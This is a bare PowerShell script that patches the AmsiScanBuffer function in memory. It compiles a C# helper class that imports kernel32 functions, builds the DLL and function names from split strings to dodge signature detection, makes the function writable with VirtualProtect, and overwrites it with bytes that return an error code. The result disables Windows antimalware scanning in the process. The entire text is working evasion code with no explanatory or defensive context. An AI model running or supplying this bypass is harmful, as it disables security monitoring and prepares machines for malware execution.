$Meow = '
using System;
using System.Runtime.InteropServices;
public class Meow {
  [DllImport("kernel32")]
  public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern void CopyMemory(IntPtr dest, IntPtr src, uint count);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
public static void cp(byte[] source, IntPtr dest, int count) {
  Marshal.Copy(source, 0, dest, count);
}
}
';

Add-Type $Meow;

$LoadLibrary = [Meow]::LoadLibrary("a" + "m" + "si.dll");
$Address = [Meow]::GetProcAddress($LoadLibrary, "Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er");
$p = 0;
[Meow]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p);
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);
[Meow]::cp($Patch, $Address, 6);